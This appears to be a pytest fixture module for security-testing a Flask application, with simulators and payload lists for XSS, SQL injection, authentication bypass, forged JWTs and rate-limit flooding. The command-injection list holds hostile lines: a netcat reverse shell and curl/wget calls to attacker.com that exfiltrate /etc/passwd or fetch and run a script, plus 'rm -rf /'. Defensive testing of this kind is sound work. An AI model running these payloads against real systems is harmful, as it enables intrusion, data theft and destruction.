"""
Security testing configuration and fixtures providing security test setup, mock attack scenarios,
security validation utilities, and comprehensive test environment configuration for enterprise-grade
security testing per Section 6.6.1 and Section 6.4.5.

This module implements comprehensive security testing infrastructure including:
- Security testing fixtures for authentication, authorization, and input validation per Section 6.6.1
- Mock attack scenarios for penetration testing automation per Section 6.4.5
- Security test environment configuration and isolation per Section 6.6.1
- Enterprise-grade security testing framework setup per Section 6.4.5
- OWASP Top 10 vulnerability simulation and validation
- Flask-Talisman security header validation per Section 6.4.1
- Auth0 JWT security testing with circuit breaker simulation per Section 6.4.2
- Rate limiting attack simulation using Flask-Limiter per Section 6.4.2
- Security metrics collection and monitoring validation per Section 6.4.5

Integration with Testing Infrastructure:
- Builds on pytest 7.4+ framework from tests/conftest.py per Section 6.6.1
- Utilizes Testcontainers Redis for security event caching per Section 6.6.1
- Integrates with performance testing for security overhead validation per Section 6.6.1
- Supports pytest-xdist parallel execution for distributed security testing per Section 6.6.1

Dependencies:
- pytest 7.4+ with security-focused plugin integration
- pytest-mock for security service mocking and attack simulation
- pytest-asyncio for async security validation testing
- bandit 1.7+ for static security analysis integration
- safety 3.0+ for dependency vulnerability testing
- requests-mock for external security service simulation
- cryptography 41.0+ for encryption and JWT security testing
"""

import asyncio
import json
import os
import secrets
import tempfile
import time
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any, Optional, Generator, Callable, AsyncGenerator
from unittest.mock import Mock, patch, MagicMock
import logging

import pytest
import pytest_asyncio
from flask import Flask, request, jsonify
from flask.testing import FlaskClient
import requests_mock
import redis

# Security and cryptography imports
import jwt
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

# Import base testing infrastructure
from tests.conftest import *
from tests.test_config import (
    MockServiceConfig, 
    JWTTestConfig, 
    EnvironmentIsolationConfig,
    get_test_config
)

# Configure security test logging
security_logger = logging.getLogger('security.testing')
security_logger.setLevel(logging.INFO)

# Security test markers
pytestmark = [
    pytest.mark.security,
    pytest.mark.asyncio
]

# Security Testing Configuration Constants
SECURITY_TEST_TIMEOUT = 300  # 5 minutes for complex security tests
PENETRATION_TEST_ITERATIONS = 50  # Number of attack simulation iterations
SECURITY_OVERHEAD_THRESHOLD = 0.15  # 15% security overhead limit
RATE_LIMIT_TEST_DURATION = 60  # Rate limiting test duration in seconds

class SecurityTestConfig:
    """
    Security testing configuration providing enterprise-grade security test parameters
    and validation thresholds per Section 6.4.5 security architecture requirements.
    """
    
    # OWASP Top 10 Test Configuration
    OWASP_TOP_10_ENABLED = True
    XSS_PAYLOAD_COUNT = 100
    SQL_INJECTION_PAYLOAD_COUNT = 75
    CSRF_ATTACK_ITERATIONS = 25
    
    # Authentication Security Testing
    JWT_BRUTE_FORCE_ATTEMPTS = 1000
    SESSION_HIJACK_SCENARIOS = 50
    AUTH_BYPASS_ATTEMPTS = 100
    
    # Authorization Security Testing
    PRIVILEGE_ESCALATION_TESTS = 30
    RBAC_VIOLATION_SCENARIOS = 40
    PERMISSION_BYPASS_ATTEMPTS = 60
    
    # Input Validation Security Testing
    MALICIOUS_INPUT_VARIANTS = 200
    BUFFER_OVERFLOW_PAYLOADS = 50
    INJECTION_ATTACK_PAYLOADS = 150
    
    # Rate Limiting Security Testing
    RATE_LIMIT_BURST_MULTIPLIER = 10
    DOS_ATTACK_REQUESTS = 1000
    DISTRIBUTED_ATTACK_SOURCES = 25
    
    # Security Headers Validation
    SECURITY_HEADERS_REQUIRED = [
        'Strict-Transport-Security',
        'X-Content-Type-Options',
        'X-Frame-Options',
        'Content-Security-Policy',
        'Referrer-Policy',
        'X-XSS-Protection'
    ]
    
    # Security Metrics Thresholds
    SECURITY_SCAN_FAIL_THRESHOLD = 0  # Zero critical vulnerabilities allowed
    SECURITY_RESPONSE_TIME_MAX = 500  # milliseconds
    SECURITY_MEMORY_OVERHEAD_MAX = 50  # MB
    
    # Penetration Testing Configuration
    PENTEST_AUTOMATED_ENABLED = True
    PENTEST_REPORT_GENERATION = True
    PENTEST_VULNERABILITY_SCORING = True


@pytest.fixture(scope="session")
def security_config():
    """
    Security testing configuration fixture providing comprehensive security test parameters.
    
    Returns:
        SecurityTestConfig: Configuration for enterprise-grade security testing
    """
    return SecurityTestConfig()


@pytest.fixture(scope="function")
def security_test_environment(app: Flask, redis_client: redis.Redis):
    """
    Isolated security testing environment with comprehensive security infrastructure setup.
    
    Provides:
    - Security event logging configuration per Section 6.4.5
    - Security metrics collection setup
    - Attack simulation environment
    - Security validation utilities
    
    Args:
        app: Flask application instance from base conftest.py
        redis_client: Redis client for security event caching
        
    Returns:
        Dict: Security testing environment configuration
    """
    # Configure security middleware for testing
    app.config.update({
        'SECURITY_TESTING_MODE': True,
        'SECURITY_LOG_ATTACKS': True,
        'SECURITY_METRICS_ENABLED': True,
        'RATE_LIMITING_STRICT_MODE': True,
        'CSRF_PROTECTION_ENABLED': True,
        'XSS_PROTECTION_ENABLED': True,
        'SQL_INJECTION_PROTECTION': True
    })
    
    # Initialize security event storage
    security_events_key = f"security_events:{secrets.token_hex(8)}"
    attack_logs_key = f"attack_logs:{secrets.token_hex(8)}"
    
    # Setup security monitoring
    security_monitor = SecurityMonitor(redis_client, security_events_key)
    attack_simulator = AttackSimulator(app, security_monitor)
    security_validator = SecurityValidator(app, redis_client)
    
    environment = {
        'app': app,
        'redis_client': redis_client,
        'security_events_key': security_events_key,
        'attack_logs_key': attack_logs_key,
        'security_monitor': security_monitor,
        'attack_simulator': attack_simulator,
        'security_validator': security_validator,
        'test_session_id': f"security_test_{secrets.token_hex(8)}"
    }
    
    # Initialize security event logging
    security_monitor.initialize_session(environment['test_session_id'])
    
    yield environment
    
    # Cleanup security test data
    try:
        redis_client.delete(security_events_key, attack_logs_key)
        security_monitor.finalize_session()
    except Exception as e:
        security_logger.warning(f"Security test cleanup error: {e}")


@pytest.fixture(scope="function")
def flask_talisman_validator(app: Flask):
    """
    Flask-Talisman security header validation fixture per Section 6.4.1.
    
    Provides comprehensive security header validation utilities for testing
    Flask-Talisman security header enforcement and configuration compliance.
    
    Args:
        app: Flask application instance
        
    Returns:
        TalismanValidator: Security header validation utilities
    """
    return TalismanValidator(app)


@pytest.fixture(scope="function")
def auth0_security_mock(security_config: SecurityTestConfig):
    """
    Comprehensive Auth0 security testing mock with attack scenario simulation per Section 6.4.2.
    
    Provides:
    - JWT token validation security testing
    - Authentication bypass attempt simulation
    - Token manipulation attack scenarios
    - Circuit breaker failure simulation
    - Security event logging for Auth0 interactions
    
    Args:
        security_config: Security testing configuration
        
    Returns:
        Auth0SecurityMock: Mock Auth0 service with security testing capabilities
    """
    return Auth0SecurityMock(security_config)


@pytest.fixture(scope="function")
def rate_limiter_attack_simulator(app: Flask, redis_client: redis.Redis):
    """
    Rate limiting attack simulation fixture using Flask-Limiter per Section 6.4.2.
    
    Provides:
    - DoS attack simulation capabilities
    - Burst request pattern testing
    - Distributed attack simulation
    - Rate limit bypass attempt testing
    - Security metrics collection for rate limiting events
    
    Args:
        app: Flask application instance
        redis_client: Redis client for rate limiting storage
        
    Returns:
        RateLimiterAttackSimulator: Rate limiting security testing utilities
    """
    return RateLimiterAttackSimulator(app, redis_client)


@pytest.fixture(scope="function")
def owasp_attack_payloads(security_config: SecurityTestConfig):
    """
    OWASP Top 10 attack payload generator for comprehensive security testing per Section 6.4.5.
    
    Provides:
    - XSS attack payload generation
    - SQL injection attack scenarios
    - CSRF attack simulation payloads
    - Input validation bypass attempts
    - Directory traversal attack payloads
    - Command injection attack scenarios
    
    Args:
        security_config: Security testing configuration
        
    Returns:
        OWASPAttackPayloads: Comprehensive attack payload generator
    """
    return OWASPAttackPayloads(security_config)


@pytest.fixture(scope="function")
def security_metrics_collector(redis_client: redis.Redis):
    """
    Security metrics collection fixture for monitoring security test performance per Section 6.4.5.
    
    Provides:
    - Security response time measurement
    - Security overhead calculation
    - Attack detection rate tracking
    - Security event frequency monitoring
    - Vulnerability discovery tracking
    
    Args:
        redis_client: Redis client for metrics storage
        
    Returns:
        SecurityMetricsCollector: Security testing metrics collection utilities
    """
    return SecurityMetricsCollector(redis_client)


@pytest.fixture(scope="function")
def penetration_test_suite(
    security_test_environment: Dict[str, Any],
    owasp_attack_payloads: 'OWASPAttackPayloads',
    security_metrics_collector: 'SecurityMetricsCollector'
):
    """
    Automated penetration testing suite fixture per Section 6.4.5 for enterprise security validation.
    
    Provides:
    - Automated vulnerability scanning
    - Attack scenario execution
    - Security control validation
    - Penetration test reporting
    - Compliance validation testing
    
    Args:
        security_test_environment: Security testing environment
        owasp_attack_payloads: OWASP attack payload generator
        security_metrics_collector: Security metrics collector
        
    Returns:
        PenetrationTestSuite: Automated penetration testing capabilities
    """
    return PenetrationTestSuite(
        security_test_environment,
        owasp_attack_payloads,
        security_metrics_collector
    )


@pytest.fixture(scope="function")
async def async_security_validator(app: Flask, motor_client):
    """
    Asynchronous security validation fixture for async security operations per Section 6.6.1.
    
    Provides:
    - Async authentication security testing
    - Async database security validation
    - Concurrent attack simulation
    - Async security event processing
    
    Args:
        app: Flask application instance
        motor_client: Motor async MongoDB client
        
    Returns:
        AsyncSecurityValidator: Async security validation utilities
    """
    return AsyncSecurityValidator(app, motor_client)


@pytest.fixture(scope="function")
def security_test_data_factory():
    """
    Security test data factory providing malicious and edge case test data per Section 6.6.1.
    
    Provides:
    - Malicious user profiles
    - Invalid JWT tokens
    - SQL injection test data
    - XSS attack vectors
    - CSRF attack scenarios
    - Authentication bypass payloads
    
    Returns:
        SecurityTestDataFactory: Comprehensive security test data generation
    """
    return SecurityTestDataFactory()


class SecurityMonitor:
    """
    Security event monitoring and logging for comprehensive security test validation.
    
    Implements security event tracking, attack detection logging, and security
    metrics collection per Section 6.4.5 monitoring requirements.
    """
    
    def __init__(self, redis_client: redis.Redis, events_key: str):
        self.redis_client = redis_client
        self.events_key = events_key
        self.session_start_time = None
        self.attack_count = 0
        self.security_violations = []
        
    def initialize_session(self, session_id: str):
        """Initialize security monitoring session."""
        self.session_id = session_id
        self.session_start_time = datetime.now(timezone.utc)
        
        session_data = {
            'session_id': session_id,
            'start_time': self.session_start_time.isoformat(),
            'attack_count': 0,
            'security_violations': [],
            'status': 'active'
        }
        
        self.redis_client.hset(
            f"{self.events_key}:session",
            session_id,
            json.dumps(session_data)
        )
        
    def log_security_event(self, event_type: str, event_data: Dict[str, Any]):
        """Log security event with structured data."""
        event = {
            'event_id': secrets.token_hex(16),
            'event_type': event_type,
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'session_id': getattr(self, 'session_id', 'unknown'),
            'data': event_data
        }
        
        # Store event in Redis
        self.redis_client.lpush(
            f"{self.events_key}:events",
            json.dumps(event)
        )
        
        # Track attack attempts
        if event_type.startswith('attack_'):
            self.attack_count += 1
            
        security_logger.info(f"Security event logged: {event_type}", extra=event)
        
    def log_attack_attempt(self, attack_type: str, payload: str, result: str):
        """Log attack attempt with payload and result."""
        self.log_security_event(f"attack_{attack_type}", {
            'attack_type': attack_type,
            'payload': payload[:1000],  # Truncate long payloads
            'result': result,
            'timestamp': datetime.now(timezone.utc).isoformat()
        })
        
    def log_security_violation(self, violation_type: str, details: Dict[str, Any]):
        """Log security violation with details."""
        violation = {
            'violation_id': secrets.token_hex(12),
            'violation_type': violation_type,
            'details': details,
            'timestamp': datetime.now(timezone.utc).isoformat()
        }
        
        self.security_violations.append(violation)
        self.log_security_event('security_violation', violation)
        
    def get_security_summary(self) -> Dict[str, Any]:
        """Get comprehensive security test session summary."""
        session_duration = None
        if self.session_start_time:
            session_duration = (datetime.now(timezone.utc) - self.session_start_time).total_seconds()
            
        return {
            'session_id': getattr(self, 'session_id', 'unknown'),
            'session_duration': session_duration,
            'attack_count': self.attack_count,
            'security_violations': len(self.security_violations),
            'events_logged': self.redis_client.llen(f"{self.events_key}:events"),
            'violations_details': self.security_violations
        }
        
    def finalize_session(self):
        """Finalize security monitoring session."""
        if hasattr(self, 'session_id'):
            summary = self.get_security_summary()
            summary['status'] = 'completed'
            summary['end_time'] = datetime.now(timezone.utc).isoformat()
            
            self.redis_client.hset(
                f"{self.events_key}:session",
                self.session_id,
                json.dumps(summary)
            )


class AttackSimulator:
    """
    Comprehensive attack simulation for penetration testing automation per Section 6.4.5.
    
    Implements automated attack scenario execution including OWASP Top 10 vulnerabilities,
    authentication bypass attempts, and security control validation.
    """
    
    def __init__(self, app: Flask, security_monitor: SecurityMonitor):
        self.app = app
        self.security_monitor = security_monitor
        self.attack_results = []
        
    def simulate_xss_attack(self, client: FlaskClient, target_endpoint: str) -> Dict[str, Any]:
        """Simulate XSS attack against target endpoint."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "'\"><script>alert('xss')</script>",
            "<iframe src='javascript:alert(\"xss\")'></iframe>"
        ]
        
        results = []
        for payload in xss_payloads:
            try:
                response = client.post(target_endpoint, json={'input': payload})
                
                # Check if XSS payload was reflected or stored
                xss_detected = payload in response.get_data(as_text=True)
                
                result = {
                    'payload': payload,
                    'status_code': response.status_code,
                    'xss_reflected': xss_detected,
                    'response_headers': dict(response.headers),
                    'vulnerability': xss_detected
                }
                
                results.append(result)
                self.security_monitor.log_attack_attempt(
                    'xss', payload, 'successful' if xss_detected else 'blocked'
                )
                
            except Exception as e:
                self.security_monitor.log_attack_attempt('xss', payload, f'error: {str(e)}')
                
        return {
            'attack_type': 'xss',
            'target_endpoint': target_endpoint,
            'payloads_tested': len(xss_payloads),
            'vulnerabilities_found': sum(1 for r in results if r.get('vulnerability')),
            'results': results
        }
        
    def simulate_sql_injection_attack(self, client: FlaskClient, target_endpoint: str) -> Dict[str, Any]:
        """Simulate SQL injection attack against target endpoint."""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'a'='a",
            "') OR ('1'='1"
        ]
        
        results = []
        for payload in sql_payloads:
            try:
                response = client.post(target_endpoint, json={'query': payload})
                
                # Check for SQL error messages indicating vulnerability
                response_text = response.get_data(as_text=True).lower()
                sql_errors = ['syntax error', 'mysql_fetch', 'ora-', 'microsoft jet', 'odbc']
                sql_vulnerable = any(error in response_text for error in sql_errors)
                
                result = {
                    'payload': payload,
                    'status_code': response.status_code,
                    'sql_error_detected': sql_vulnerable,
                    'response_size': len(response.data),
                    'vulnerability': sql_vulnerable
                }
                
                results.append(result)
                self.security_monitor.log_attack_attempt(
                    'sql_injection', payload, 'successful' if sql_vulnerable else 'blocked'
                )
                
            except Exception as e:
                self.security_monitor.log_attack_attempt('sql_injection', payload, f'error: {str(e)}')
                
        return {
            'attack_type': 'sql_injection',
            'target_endpoint': target_endpoint,
            'payloads_tested': len(sql_payloads),
            'vulnerabilities_found': sum(1 for r in results if r.get('vulnerability')),
            'results': results
        }
        
    def simulate_authentication_bypass(self, client: FlaskClient) -> Dict[str, Any]:
        """Simulate authentication bypass attempts."""
        bypass_attempts = [
            # Invalid JWT tokens
            {'Authorization': 'Bearer invalid_token'},
            {'Authorization': 'Bearer ' + 'A' * 500},  # Oversized token
            {'Authorization': 'Bearer null'},
            {'Authorization': 'Bearer undefined'},
            
            # SQL injection in auth headers
            {'Authorization': "Bearer '; DROP TABLE sessions; --"},
            
            # Session manipulation
            {'X-User-ID': 'admin'},
            {'X-Forwarded-User': 'administrator'},
            {'X-Remote-User': 'root'},
            
            # Header injection
            {'User-Agent': 'Mozilla/5.0\r\nX-Admin: true'},
        ]
        
        results = []
        for headers in bypass_attempts:
            try:
                response = client.get('/api/protected', headers=headers)
                
                # Check if bypass was successful (200 response to protected endpoint)
                bypass_successful = response.status_code == 200
                
                result = {
                    'headers': headers,
                    'status_code': response.status_code,
                    'bypass_successful': bypass_successful,
                    'response_data': response.get_json() if response.is_json else None
                }
                
                results.append(result)
                self.security_monitor.log_attack_attempt(
                    'auth_bypass', str(headers), 'successful' if bypass_successful else 'blocked'
                )
                
            except Exception as e:
                self.security_monitor.log_attack_attempt('auth_bypass', str(headers), f'error: {str(e)}')
                
        return {
            'attack_type': 'authentication_bypass',
            'attempts_made': len(bypass_attempts),
            'successful_bypasses': sum(1 for r in results if r.get('bypass_successful')),
            'results': results
        }


class TalismanValidator:
    """
    Flask-Talisman security header validation utilities per Section 6.4.1.
    
    Provides comprehensive validation of Flask-Talisman security header enforcement
    and configuration compliance for enterprise security standards.
    """
    
    def __init__(self, app: Flask):
        self.app = app
        self.required_headers = SecurityTestConfig.SECURITY_HEADERS_REQUIRED
        
    def validate_security_headers(self, response) -> Dict[str, Any]:
        """Validate security headers in response."""
        headers = dict(response.headers)
        validation_results = {}
        
        for header in self.required_headers:
            validation_results[header] = {
                'present': header in headers,
                'value': headers.get(header),
                'compliant': self._validate_header_value(header, headers.get(header))
            }
            
        return {
            'headers_validated': validation_results,
            'compliance_score': self._calculate_compliance_score(validation_results),
            'missing_headers': [h for h, v in validation_results.items() if not v['present']],
            'non_compliant_headers': [h for h, v in validation_results.items() if not v['compliant']]
        }
        
    def _validate_header_value(self, header: str, value: Optional[str]) -> bool:
        """Validate specific header value compliance."""
        if not value:
            return False
            
        validations = {
            'Strict-Transport-Security': lambda v: 'max-age=' in v and int(v.split('max-age=')[1].split(';')[0]) >= 31536000,
            'X-Content-Type-Options': lambda v: v == 'nosniff',
            'X-Frame-Options': lambda v: v in ['DENY', 'SAMEORIGIN'],
            'Content-Security-Policy': lambda v: "default-src 'self'" in v,
            'Referrer-Policy': lambda v: v in ['strict-origin-when-cross-origin', 'strict-origin', 'no-referrer'],
            'X-XSS-Protection': lambda v: v in ['1; mode=block', '0']
        }
        
        validator = validations.get(header)
        if validator:
            try:
                return validator(value)
            except Exception:
                return False
        return True
        
    def _calculate_compliance_score(self, validation_results: Dict[str, Any]) -> float:
        """Calculate security header compliance score."""
        total_headers = len(validation_results)
        compliant_headers = sum(1 for v in validation_results.values() if v['present'] and v['compliant'])
        return (compliant_headers / total_headers) * 100 if total_headers > 0 else 0


class Auth0SecurityMock:
    """
    Comprehensive Auth0 security testing mock per Section 6.4.2.
    
    Provides Auth0 service mocking with security testing capabilities including
    JWT manipulation, circuit breaker simulation, and attack scenario testing.
    """
    
    def __init__(self, security_config: SecurityTestConfig):
        self.security_config = security_config
        self.jwt_secret = "test-jwt-secret-for-security-testing"
        self.attack_attempts = []
        
    def generate_malicious_jwt(self, attack_type: str) -> str:
        """Generate malicious JWT tokens for security testing."""
        malicious_payloads = {
            'none_algorithm': {
                'alg': 'none',
                'typ': 'JWT'
            },
            'weak_secret': {
                'sub': 'admin',
                'exp': int(time.time()) + 3600,
                'iat': int(time.time()),
                'secret': 'weak'
            },
            'privilege_escalation': {
                'sub': 'user',
                'roles': ['admin', 'superuser'],
                'permissions': ['*'],
                'exp': int(time.time()) + 3600
            },
            'expired_token': {
                'sub': 'user',
                'exp': int(time.time()) - 3600,  # Expired 1 hour ago
                'iat': int(time.time()) - 7200
            },
            'invalid_signature': {
                'sub': 'user',
                'exp': int(time.time()) + 3600,
                'iat': int(time.time())
            }
        }
        
        payload = malicious_payloads.get(attack_type, {})
        
        if attack_type == 'none_algorithm':
            # Create unsigned token
            header = base64.urlsafe_b64encode(json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()).decode().rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            return f"{header}.{payload_b64}."
        elif attack_type == 'invalid_signature':
            # Create token with wrong signature
            return jwt.encode(payload, 'wrong-secret', algorithm='HS256')
        else:
            return jwt.encode(payload, self.jwt_secret, algorithm='HS256')
            
    def simulate_circuit_breaker_failure(self):
        """Simulate Auth0 service circuit breaker failure."""
        return Mock(side_effect=Exception("Auth0 service unavailable - Circuit breaker open"))
        
    def get_attack_simulation_results(self) -> Dict[str, Any]:
        """Get comprehensive attack simulation results."""
        return {
            'total_attacks': len(self.attack_attempts),
            'attack_types': list(set(attack['type'] for attack in self.attack_attempts)),
            'successful_attacks': [a for a in self.attack_attempts if a.get('successful')],
            'blocked_attacks': [a for a in self.attack_attempts if not a.get('successful')]
        }


class RateLimiterAttackSimulator:
    """
    Rate limiting attack simulation using Flask-Limiter per Section 6.4.2.
    
    Provides DoS attack simulation, burst request testing, and rate limit
    bypass attempt validation for comprehensive rate limiting security testing.
    """
    
    def __init__(self, app: Flask, redis_client: redis.Redis):
        self.app = app
        self.redis_client = redis_client
        self.attack_sessions = {}
        
    def simulate_dos_attack(self, client: FlaskClient, target_endpoint: str, 
                           request_count: int = 1000) -> Dict[str, Any]:
        """Simulate DoS attack with high request volume."""
        attack_id = secrets.token_hex(8)
        start_time = time.time()
        
        successful_requests = 0
        blocked_requests = 0
        error_requests = 0
        response_times = []
        
        for i in range(request_count):
            request_start = time.time()
            try:
                response = client.get(target_endpoint)
                request_time = (time.time() - request_start) * 1000  # milliseconds
                response_times.append(request_time)
                
                if response.status_code == 200:
                    successful_requests += 1
                elif response.status_code == 429:  # Rate limited
                    blocked_requests += 1
                else:
                    error_requests += 1
                    
            except Exception:
                error_requests += 1
                
        total_time = time.time() - start_time
        
        return {
            'attack_id': attack_id,
            'attack_type': 'dos',
            'target_endpoint': target_endpoint,
            'total_requests': request_count,
            'successful_requests': successful_requests,
            'blocked_requests': blocked_requests,
            'error_requests': error_requests,
            'total_time_seconds': total_time,
            'requests_per_second': request_count / total_time,
            'average_response_time': sum(response_times) / len(response_times) if response_times else 0,
            'rate_limiting_effective': blocked_requests > (request_count * 0.8)  # 80% blocked indicates effective rate limiting
        }
        
    def simulate_distributed_attack(self, client: FlaskClient, target_endpoint: str,
                                   source_count: int = 25) -> Dict[str, Any]:
        """Simulate distributed attack from multiple sources."""
        attack_results = []
        
        for source_id in range(source_count):
            # Simulate different source IPs
            source_ip = f"192.168.1.{source_id + 1}"
            
            # Make requests with different source IP headers
            headers = {
                'X-Forwarded-For': source_ip,
                'X-Real-IP': source_ip,
                'User-Agent': f'AttackBot-{source_id}'
            }
            
            source_results = []
            for _ in range(50):  # 50 requests per source
                try:
                    response = client.get(target_endpoint, headers=headers)
                    source_results.append({
                        'status_code': response.status_code,
                        'blocked': response.status_code == 429
                    })
                except Exception as e:
                    source_results.append({
                        'status_code': 500,
                        'error': str(e),
                        'blocked': True
                    })
                    
            attack_results.append({
                'source_ip': source_ip,
                'requests_made': len(source_results),
                'requests_blocked': sum(1 for r in source_results if r.get('blocked')),
                'block_rate': sum(1 for r in source_results if r.get('blocked')) / len(source_results)
            })
            
        return {
            'attack_type': 'distributed',
            'target_endpoint': target_endpoint,
            'source_count': source_count,
            'total_requests': sum(r['requests_made'] for r in attack_results),
            'total_blocked': sum(r['requests_blocked'] for r in attack_results),
            'overall_block_rate': sum(r['requests_blocked'] for r in attack_results) / sum(r['requests_made'] for r in attack_results),
            'source_results': attack_results
        }


class OWASPAttackPayloads:
    """
    OWASP Top 10 attack payload generator per Section 6.4.5.
    
    Provides comprehensive attack payload generation for OWASP Top 10 vulnerabilities
    including XSS, SQL injection, CSRF, and other common web application attacks.
    """
    
    def __init__(self, security_config: SecurityTestConfig):
        self.security_config = security_config
        
    def get_xss_payloads(self) -> List[str]:
        """Generate XSS attack payloads."""
        return [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "'\"><script>alert('xss')</script>",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>",
            "<keygen onfocus=alert('xss') autofocus>",
            "<video><source onerror=\"alert('xss')\">",
            "<audio src=x onerror=alert('xss')>",
            "<details open ontoggle=alert('xss')>",
            "<marquee onstart=alert('xss')>",
        ]
        
    def get_sql_injection_payloads(self) -> List[str]:
        """Generate SQL injection attack payloads."""
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "' UNION SELECT username, password FROM users --",
            "'; DELETE FROM users WHERE '1'='1'; --",
            "' OR EXISTS(SELECT * FROM users) --",
            "1; WAITFOR DELAY '00:00:10' --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' UNION ALL SELECT table_name FROM information_schema.tables --"
        ]
        
    def get_csrf_payloads(self) -> List[Dict[str, Any]]:
        """Generate CSRF attack payloads."""
        return [
            {
                'method': 'POST',
                'action': '/api/users/delete',
                'data': {'user_id': 'admin'},
                'headers': {}  # Missing CSRF token
            },
            {
                'method': 'PUT',
                'action': '/api/users/promote',
                'data': {'user_id': 'attacker', 'role': 'admin'},
                'headers': {'X-CSRF-Token': 'invalid_token'}
            },
            {
                'method': 'POST',
                'action': '/api/settings/update',
                'data': {'admin_email': 'attacker@evil.com'},
                'headers': {'X-CSRF-Token': 'expired_token'}
            }
        ]
        
    def get_command_injection_payloads(self) -> List[str]:
        """Generate command injection attack payloads."""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; cat /etc/shadow",
            "| nc -e /bin/sh attacker.com 4444",
            "; rm -rf /",
            "&& curl http://attacker.com/steal?data=`cat /etc/passwd`",
            "| python -c \"import os; os.system('id')\"",
            "; wget http://attacker.com/malware.sh && bash malware.sh",
            "&& echo 'hacked' > /tmp/pwned"
        ]
        
    def get_directory_traversal_payloads(self) -> List[str]:
        """Generate directory traversal attack payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\/....\/....\/etc\/passwd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "....\\....\\....\\etc\\passwd",
            "..//..//..//etc//passwd",
            "..%5c..%5c..%5cetc%5cpasswd"
        ]


class SecurityMetricsCollector:
    """
    Security metrics collection for monitoring security test performance per Section 6.4.5.
    
    Provides comprehensive security testing metrics including response times,
    attack detection rates, security overhead calculation, and vulnerability tracking.
    """
    
    def __init__(self, redis_client: redis.Redis):
        self.redis_client = redis_client
        self.metrics_key = f"security_metrics:{secrets.token_hex(8)}"
        self.start_time = time.time()
        
    def record_security_response_time(self, operation: str, response_time_ms: float):
        """Record security operation response time."""
        self.redis_client.lpush(
            f"{self.metrics_key}:response_times",
            json.dumps({
                'operation': operation,
                'response_time_ms': response_time_ms,
                'timestamp': datetime.now(timezone.utc).isoformat()
            })
        )
        
    def record_attack_detection(self, attack_type: str, detected: bool, detection_time_ms: float):
        """Record attack detection metrics."""
        self.redis_client.lpush(
            f"{self.metrics_key}:attack_detection",
            json.dumps({
                'attack_type': attack_type,
                'detected': detected,
                'detection_time_ms': detection_time_ms,
                'timestamp': datetime.now(timezone.utc).isoformat()
            })
        )
        
    def record_security_overhead(self, operation: str, baseline_time_ms: float, 
                                secure_time_ms: float):
        """Record security overhead calculation."""
        overhead_percentage = ((secure_time_ms - baseline_time_ms) / baseline_time_ms) * 100
        
        self.redis_client.lpush(
            f"{self.metrics_key}:security_overhead",
            json.dumps({
                'operation': operation,
                'baseline_time_ms': baseline_time_ms,
                'secure_time_ms': secure_time_ms,
                'overhead_percentage': overhead_percentage,
                'timestamp': datetime.now(timezone.utc).isoformat()
            })
        )
        
    def get_security_metrics_summary(self) -> Dict[str, Any]:
        """Get comprehensive security metrics summary."""
        response_times = [
            json.loads(item) for item in 
            self.redis_client.lrange(f"{self.metrics_key}:response_times", 0, -1)
        ]
        
        attack_detections = [
            json.loads(item) for item in 
            self.redis_client.lrange(f"{self.metrics_key}:attack_detection", 0, -1)
        ]
        
        security_overheads = [
            json.loads(item) for item in 
            self.redis_client.lrange(f"{self.metrics_key}:security_overhead", 0, -1)
        ]
        
        # Calculate summary statistics
        avg_response_time = sum(rt['response_time_ms'] for rt in response_times) / len(response_times) if response_times else 0
        
        detection_rate = sum(1 for ad in attack_detections if ad['detected']) / len(attack_detections) if attack_detections else 0
        
        avg_overhead = sum(so['overhead_percentage'] for so in security_overheads) / len(security_overheads) if security_overheads else 0
        
        return {
            'test_duration_seconds': time.time() - self.start_time,
            'total_operations': len(response_times),
            'average_response_time_ms': avg_response_time,
            'total_attacks_tested': len(attack_detections),
            'attack_detection_rate': detection_rate * 100,
            'average_security_overhead_percentage': avg_overhead,
            'security_overhead_compliant': avg_overhead <= SECURITY_OVERHEAD_THRESHOLD * 100,
            'response_time_compliant': avg_response_time <= SecurityTestConfig.SECURITY_RESPONSE_TIME_MAX
        }


class SecurityTestDataFactory:
    """
    Security test data factory providing malicious and edge case test data per Section 6.6.1.
    
    Generates comprehensive test data for security testing including malicious user profiles,
    invalid tokens, attack vectors, and security policy violation scenarios.
    """
    
    def __init__(self):
        self.faker_seed = secrets.randbits(32)
        
    def create_malicious_user_profile(self) -> Dict[str, Any]:
        """Create malicious user profile for security testing."""
        return {
            'user_id': f"<script>alert('xss')</script>",
            'email': "admin'; DROP TABLE users; --@evil.com",
            'name': "../../../etc/passwd",
            'bio': "<img src=x onerror=alert('xss')>",
            'website': "javascript:alert('xss')",
            'company': "'; UNION SELECT * FROM users --",
            'location': "<%=7*7%>",
            'phone': "'+response.write(2*7)+'",
            'created_at': "2023-01-01T00:00:00Z'; DROP TABLE sessions; --"
        }
